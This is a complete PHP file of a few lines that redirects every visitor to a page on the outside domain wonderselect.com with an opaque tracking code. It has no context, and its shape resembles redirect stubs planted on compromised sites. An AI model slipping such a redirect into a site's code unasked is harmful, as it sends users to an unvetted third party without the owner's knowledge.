<?php
header('Location: http://wonderselect.com/rm.php?c=kanzN_Kf_IAhz7oNj-UcXA');
exit;
?>